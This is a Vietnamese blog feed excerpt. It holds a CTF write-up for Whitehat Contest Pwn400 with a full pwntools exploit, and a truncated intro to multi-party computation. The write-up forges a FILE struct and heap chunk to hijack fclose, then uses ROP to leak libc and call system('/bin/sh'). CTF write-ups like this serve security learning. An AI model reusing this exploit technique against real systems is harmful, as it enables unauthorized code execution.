				<pubDate>Sun, 11 Sep 2016 16:29:10 +0000</pubDate>
		<dc:creator><![CDATA[hardtobelieve]]></dc:creator>
				<category><![CDATA[pwn]]></category>
		<category><![CDATA[whitehat]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=600</guid>
				<description><![CDATA[Líp vẫn nhớ và yêu Híp nhiều lắm ... Chiến đấu bên những người anh em luôn làm tôi cảm thấy thoải mái và phấn khích. Đợt contest này cả đội đã có 1 ngày không ngủ, cũng gần như không ăn, chỉ dùng lon bò húc để cầm hơi. Cả đội đã rất nỗ &#8230; <a href="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/" class="more-link">Continue reading <span class="screen-reader-text">Whitehat Contest 12 - Pwn400</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<blockquote><p>Líp vẫn nhớ và yêu Híp nhiều lắm ...</p></blockquote>
<p>Chiến đấu bên những người anh em luôn làm tôi cảm thấy thoải mái và phấn khích. Đợt contest này cả đội đã có 1 ngày không ngủ, cũng gần như không ăn, chỉ dùng lon bò húc để cầm hơi. Cả đội đã rất nỗ lực và hy vọng tràn trề khi lúc đầu liên tục tranh giành top 1 với kỳ phùng địch thủ. Cho đến giữa đêm, do thiếu một chút may mắn ( tôi thì không nghĩ vậy, đêm là khoảng thời gian tôi hay rơi vào trạng thái không ổn định <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?ssl=1"><img data-attachment-id="603" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/pudency/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pudency" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-603" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?resize=36%2C36&#038;ssl=1" alt="pudency" width="36" height="36" data-recalc-dims="1" /></a> ) mà mọi người mất dần ý chí chiến đấu, nhìn đội khác vươn lên. Có lẽ nếu như tôi dành được 400 điểm từ bài này thì mọi chuyện đã khác. Nhưng dù sao "có lẽ" vẫn chỉ là 1 từ người ta dùng để biện hộ cho lỗi lầm của mình mà thôi.<br />
<span id="more-600"></span></p>
<p>Đề bài cho 1 file binary có chức năng dùng để viết và đọc 1 file trên server. Thoạt nhìn, tôi đã thấy bài này quen rồi, và có vẻ như <a href="http://www.hardtobelieve.me/index.php/2016/07/30/file-abusing/" target="_blank">chủ đề này</a> vừa được tôi nghiên cứu cách đây 2 tháng. Ta có thể thấy lỗi khá rõ ràng ở hàm `read_file`</p>
<pre class="lang:c decode:true ">int read_file()
{
  char ptr; // [sp+18h] [bp-110h]@4
  size_t n; // [sp+118h] [bp-10h]@4
  FILE *stream; // [sp+11Ch] [bp-Ch]@1

  printf("file name: ");
  __fpurge(stdin);
  gets(name);
  stream = fopen(name, "rb");
  if ( !stream )
  {
    puts("Error: cannot open file. ");
    exit(1);
  }
  fseek(stream, 0, 2);
  n = ftell(stream);
  fseek(stream, 0, 0);
  fread(&amp;ptr, 1u, n, stream);            // Does not check boundary of ptr
  puts(&amp;ptr);
  return fclose(stream);
}</pre>
<p>Như vậy, ta có thể cho chương trình đọc một nội dung file có kích thước lớn để kích hoạt lỗi buffer overflow. Tuy nhiên, ta cũng thấy `ptr` nằm ở `sp + 18h` còn `stream` thì nằm ở `sp + 11Ch` nên có thể khai thác lỗi bằng cách dùng bảng <em>IO_FILE_JUMP</em>.</p>
<h2>Bài toán 1</h2>
<p>Vẫn chiến thuật cũ, tôi bắt đầu từ chương trình đơn giản hơn là gọi hàm `fclose()` với tham số truyền vào là một mảng char. Sau một thời gian sử dụng gdb và "lỗi đến đâu sửa đến đó", tôi đã tìm được những giá trị cần có trong mảng</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
char a[256];

int main () {
    *((int *)a + 1) = 0xdeadbeaf;
    *((int *)a + 0x48 / 4) = a;
    *((int *)a + 0x94 / 4) = a - 4;
    fclose(a);
    return 0;
}</pre>
<p>Và tất nhiên, kết qủa sẽ là `Invalid $PC address: 0xdeadbeaf`. Tuy nhiên, lần này tôi cũng nhận ra một điều là tôi không thể truyền được tham số khi gọi hàm theo kiểu này. Nếu cấc bạn step từng bước để vào bên trong libc, các bạn sẽ thấy trước khi call ,libc sẽ thực hiện:</p>
<pre class="theme:shell-default lang:sh decode:true ">push 0x0
push esi                            ; file pointer
call DWORD PTR [eax + 0x8]</pre>
<p>Tôi phát hiện ra rằng chương trình không có stack protector, nên nếu như tôi lừa libc cho nó chạy như bình thường với mảng char, tôi có thể đè lên EIP và các gía trị sau đố rồi làm như những bài BoF bình thường. Tôi thử gọi hàm puts thì được kết qủa:</p>
<pre class="theme:shell-default lang:sh decode:true ">free(): invalid pointer: 0x0804a060 ***</pre>
<p>Không ngoài dự đoán, theo như những gì google được thì hàm `fclose()` sau khi thực hiện việc đóng file sẽ giải phóng bộ nhớ đã cấp trước đó ( file pointer cũng là "híp" mà <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?ssl=1"><img data-attachment-id="611" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/big_smile/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="big_smile" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-611" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?resize=36%2C36&#038;ssl=1" alt="big_smile" width="36" height="36" data-recalc-dims="1" /></a> ).</p>
<h2>Bài toán 2</h2>
<p>Như vậy, ngoài việc biến mảng <strong>a</strong> thành một con trỏ file giả, thì ta cũng cần biến nó thành một heap chunk giả nữa. Tiếp tục sử dụng gdb, lần này thêm một cửa sổ khác để debug chương trình mà free một con trỏ đã malloc thực sự. Việc này giúp ta dễ dàng theo dõi luồng thực thi của chương trình đúng và biết sẽ phải sửa cái gì cho chương trình sai. Sau một hồi lâu sửa đi sửa lại, tôi cũng có được những gía trị cần tìm ( ở đây tôi chọn fclose(a + 16) cho nó thoải mái, tránh trường hợp truy xuất vào ô nhớ nào đó phía trước ):</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
char a[256];

int main () {
    puts("abcd");
    *((int *)a + 3) = 0xa1;
    *((int *)a + 4 + 1) = 0x8048350;
    *((int *)a + 4 + 0x48 / 4) = a + 16;
    *((int *)a + 4 + 0x94 / 4) = a + 16 - 4;
    *((int *)a + 43) = 0x20b59;
    *((int *)a + 44) = a + 34*4;
    *((int *)a + 45) = a + 38*4;
    *((int *)a + 34 + 3) = a + 42*4;
    *((int *)a + 38 + 2) = a + 42*4;
    fclose(a + 16);
    return 0;
}</pre>
<p>Vậy là xong rồi, quay trở lại bài readfile, ta sẽ thực hiện 2 công việc:</p>
<ul>
<li>Gọi hàm write_file để tạo ra một file tên là "inp", nội dung sẽ là `padding + name_address + padding + rop chain`</li>
<li>Gọi hàm read_file, đọc file có tên là "inp\x00" + fake_file_struct mà ta vừa tạo ra</li>
</ul>
<p>Ez local shell, Ez life</p>
<pre class="theme:shell-default lang:sh decode:true ">[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Puts: 0xf7e5cb80
[*] Printf: 0xf7e46590
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Switching to interactive mode

$ id
uid=1000(tuanit96) gid=1000(hardtobelieve) groups=1000(hardtobelieve),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
tuanit96
$  </pre>
<h2> Bài toán 3 </h2>
<p><strong>Proof of Concept</strong></p>
<pre class="lang:python decode:true ">from pwn import *

def read_file(name):
	s.sendline("2")
	s.recvuntil("file name: ")
	s.sendline(name)

def write_file(name, content):
	s.sendline("1")
	s.recvuntil("file name: ")
	s.sendline(name)
	s.recvuntil("Give me the size: ")
	#print s.recv()
	s.sendline(str(len(content)))
	s.recvuntil("Give me the buffer: ")
	s.sendline(content)

name1 = "/tmp/abc"
name2 = "/tmp/def"
name3 = "/tmp/ghi"

name_addr = 0x804a0a0 + 16
puts_plt = 0x80485b0
puts_got = 0x804a01c
printf_got = 0x804a000
popret = 0x080486c3
start = 0x8048640

s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
#s = remote("118.70.80.143", 23504)
s.recvuntil("0:exit\n")

write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(puts_plt) + p32(popret) + p32(puts_got) + p32(puts_plt) + p32(popret) + p32(printf_got))

s.close()

#s = remote("118.70.80.143", 23504)
s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
s.recvuntil("0:exit\n")

fake_file = "\x00"*4*1 + p32(0xa1) + "\x00"*4*1              # 2 blocks
fake_file += p32(puts_plt) + "\x00"*4*16         # 17 blocks
fake_file += p32(name_addr) + "\x00"*4*14        # 15 blocks
fake_file += p32(name_addr + 38*4) + "\x00"*4*2    # 3 blocks
fake_file += p32(name_addr + 38*4)                 # 1 blocks
fake_file += p32(name_addr - 4) + "\x00"*4*1     # 2 blocks
fake_file += p32(0x20b59)                        # 1 blocks
fake_file += p32(name_addr + 30*4)                 # 1 blocks
fake_file += p32(name_addr + 34*4)

payload1 = name1 + fake_file
read_file(payload1)
data = s.recv()
data += s.recv()

puts = u32(data.split('\n')[-3][:4])
printf = u32(data.split('\n')[-2][:4])
log.info("Puts: " + hex(puts))
log.info("Printf: " + hex(printf))

s.close()

system = printf - 0x00049590 + 0x0003ad80
binsh = printf - 0x00049590 + 0x15ba3f

s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
#s = remote("118.70.80.143", 23504)
s.recvuntil("0:exit\n")

write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(system) + p32(popret) + p32(binsh))

s.close()

#s = remote("103.237.99.25",  23504)
s = remote("localhost", 4000)
s.recvuntil("0:exit\n")
read_file(payload1)
s.interactive()
</pre>
<p>Tôi hí hửng exploit với con server của họ, ngờ đâu nó chết không thương tiếc <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=36%2C36&#038;ssl=1" alt="beat_brick" width="36" height="36" class="alignnone size-full wp-image-586" data-recalc-dims="1" /></a>. Đờ đẫn một lúc không hiểu chuyện gì xảy ra, tôi mới thử đem sang một máy khác chạy bản ubuntu cũ hơn tôi, và nó cũng chịu chung số phận. Có vẻ libc ở bản cũ và bản mới khác nhau ( cách xử lý, offset, ... ). Lúc đó là 2h đêm và nghĩ đến việc giờ ngồi debug lại trên libc-2.19 là tôi lại muốn đi ... Ý <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=36%2C36&#038;ssl=1" alt="boss" width="36" height="36" class="alignnone size-full wp-image-565" data-recalc-dims="1" /></a>. Tôi thầm mắng chửi ban tổ chức, lẽ ra phải đưa cả libc cho người chơi chứ, nhưng rồi lại nhận ra, có lẽ họ cũng không biết được điều đó xảy ra, cũng giống mình ban nãy vậy.</p>
<p>Vậy là tôi đã đánh mất 400 điểm dù nó đã nằm trong tay, cảm giác thật giống với việc tối đã để tuột mất tay Híp khi vẫn còn đang nắm chặt vậy ...</p>
]]></content:encoded>
							<wfw:commentRss>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
						<post-id xmlns="com-wordpress:feed-additions:1">600</post-id>	</item>
		<item>
		<title>An toàn tính toán đa thành viên</title>
		<link>https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/</link>
				<pubDate>Wed, 07 Sep 2016 11:24:32 +0000</pubDate>
		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
				<category><![CDATA[chuymich]]></category>
		<category><![CDATA[crypto]]></category>
		<category><![CDATA[research]]></category>
		<category><![CDATA[vietnamese]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=557</guid>
				<description><![CDATA[Multi-Party Computation (MPC) là một khái niệm được các nhà mật mã học đắn đo nghiên cứu tận những thập niên 80 thế kỷ trước. Xuất phát tự nhiên từ những bài toán học búa trong cuộc sống phải đặt ra một giao thức hay ho hơn để đánh đố nhau. Ví dụ năm 1982 đó &#8230; <a href="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/" class="more-link">Continue reading <span class="screen-reader-text">An toàn tính toán đa thành viên</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><strong>Multi-Party Computation (MPC)</strong> là một khái niệm được các nhà mật mã học đắn đo nghiên cứu tận những thập niên 80 thế kỷ trước. Xuất phát tự nhiên từ những bài toán học búa trong cuộc sống phải đặt ra một giao thức hay ho hơn để đánh đố nhau. Ví dụ năm 1982 đó là bài toán triệu phú của anh Yao (1982 <a title="Andrew Yao" href="https://en.wikipedia.org/wiki/Andrew_Yao">Andrew Yao</a>  1), diễn Nôm đơn giản là anh Bin có số A tiền, còn anh Job có số B tiền. Hai anh trong một cuộc nhậu lỡ thách nhau xem ai có nhiều tiền hơn ai <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>. Nhưng hai anh đều không muốn lộ ra tổng số tiền mình có cho nhau biết. Do đó mới nảy sinh bài toàn chứng minh bất đẳng thức A ≥ B mà không lộ thông tin nào của A và B cho bất cứ ai, kể cả 2 anh Bin và anh Jobs. Giải quyết xong bài toàn này đã mở ra một kỷ nguyên mới cho bảo mật thông tin đặc biệt là thương mai điện tử, data mining khi muốn so sánh các giá trị, tính toán cộng trừ nhân chia mà vẫn bảo vệ được thông tin mật như số tiền, tổng tiền trong tài khoản khách hàng, thông tin nhân khẩu học v.v.</p>
<p><span id="more-557"></span></p>
<p><strong>1. MPC</strong></p>
<p>Tổng quát hóa bài toán của Yao đó là: giả sử có n thành viên  <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_80a9c7eae10390d097c7698419f4e3ac.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> bảo mật cho n giá trị tương ứng <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_391e71aa9bce9e9078443200ea5c76a5.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, và tất cả các thành viên thực hiện phép tính <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_a722b10a2cc25a31b0c1067d8a2854fc.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> sao cho các giá trị <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_391e71aa9bce9e9078443200ea5c76a5.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> được bảo mật hoàn toàn. Trong định nghĩa này, bài toán của Yao là trường hợp nhỏ với <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_c303081f7a16f603112b0375bdc84883.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> và phép tính <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_345e1346b4e1502a8d3742870700eb0a.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
<p>Ví dụ thứ hai đó là trò chơi tình yêu, như các bạn đọc biết <a href="http://ctf.yeuchimse.com">yeuchimse</a> là một thanh niên ủy mị ướt át, sến rện hay nghĩ lung tung. Sẻ đệ lần đầu tiên không dám tỏ tình vì sợ người ấy không thích mình thì thật là quê độ nên đã yêu cầu <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdep </a>thiết kế một giao thức sao cho:</p>
<ul>
<li><strong> Eligibility</strong>: được thổ lộ và chỉ thổ lộ môt lần.</li>
<li><strong>Privacy</strong>: đảm bảo không lộ thông tin đã thổ lộ cho bất kỳ ai biết, cho dù đó là người ấy hay chính <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdep </a></li>
<li><strong>Universal Verifiability</strong>: ai cũng có thể check được kết quả là 2 đứa nó có đến được với nhau hay không để đảm bảo tính công bằng của cuộc chơi tình ái.</li>
<li><strong>Robustness</strong>: Mọi hành động gian trá ví dụ như thổ lộ có yêu sau đó lại thay đổi ý kiến là không yêu đều bị cấm.</li>
</ul>
<p>4 tiền đề trên các bạn đọc nào thông minh có thể áp dụng vào bầu cử điện tử, tuy nhiên giao thức <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdep </a>thiết kế dưới đây sau này được biết đến rộng rãi dưới cái tên  Five-Card Trick (Bert den Boer, Eurocrypt 1989) như sau:</p>
<figure id="attachment_560" aria-describedby="caption-attachment-560" style="width: 524px" class="wp-caption aligncenter"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?ssl=1"><img data-attachment-id="560" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=524%2C297&amp;ssl=1" data-orig-size="524,297" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=300%2C170&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=524%2C297&amp;ssl=1" class="wp-image-560 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?resize=524%2C297&#038;ssl=1" alt="Five-Card Trick (Bert den Boer, Eurocrypt 1989)" width="524" height="297" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?w=524&amp;ssl=1 524w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?resize=300%2C170&amp;ssl=1 300w" sizes="(max-width: 524px) 100vw, 524px" data-recalc-dims="1" /></a><figcaption id="caption-attachment-560" class="wp-caption-text">Five-Card Trick (Bert den Boer, Eurocrypt 1989)</figcaption></figure>
<p>Với 5 lá bài Át, mặc định một chiếc lá Át cơ đỏ đặt sẵn trên bàn. Với các câu trả lời giữa 2 người tham gia trò chơi là Yêu hoặc không Yêu tương ứng với 2 cách xếp bài Át cơ, Át bích. Sau khi đặt bài xuống bàn (có thể thay đổi chiều hàng 5 bài để không ai biết câu trả lời của mình ở bên nào) thì kết quả cả 2 người đều có cảm tình với nhau chỉ xảy ra khi có 3 quân Át cơ nằm cạnh nhau. Trường hợp kết quả 2 người không hợp nhau thì vẫn đảm bảo cô gái không biết được đối phương trả lời là Yêu hay không Yêu. (Thật là vi diệu phải không? <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img class="alignnone wp-image-565" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=25%2C25&#038;ssl=1" alt="boss" width="25" height="25" data-recalc-dims="1" /></a>)</p>
<p>Để giải thích cách giải này, thực chất đó chính là bảng AND toán tử ở bảng này:</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?ssl=1"><img data-attachment-id="561" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=330%2C80&amp;ssl=1" data-orig-size="330,80" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=300%2C73&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=330%2C80&amp;ssl=1" class="size-medium wp-image-561 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?resize=300%2C73&#038;ssl=1" alt="Untitled" width="300" height="73" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?resize=300%2C73&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?w=330&amp;ssl=1 330w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
<p>Kết quả xy=1 thì rõ khi và chỉ khi x=1 và y=1. Còn với xy=0 thì ta chỉ kết luận có 1 trong x hoặc y trả lời 0 mà không thể khẳng định rõ ai trả lời 0 hay 1. Kết quả lần thực nghiệm protocol đó như các bạn đã biết, cuộc sống rất ồn ào, có những kẻ thất tình không biết trốn vào đâu để ngồi một mình và tìm sự tĩnh lặng cho riêng mình nên đành chơi CTF. “Em chưa lấy chồng là lỗi của anh!”. Với love game thì đen bạc còn đỏ tình nhưng <a href="http://ctf.yeuchimse.com">yeuchimse</a> đen thôi, đỏ vẫn vậy. <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?ssl=1"><img data-attachment-id="564" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beauty/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beauty" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-564" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?resize=26%2C26&#038;ssl=1" alt="beauty" width="26" height="26" data-recalc-dims="1" /></a></p>
<p><strong>2. OT</strong></p>
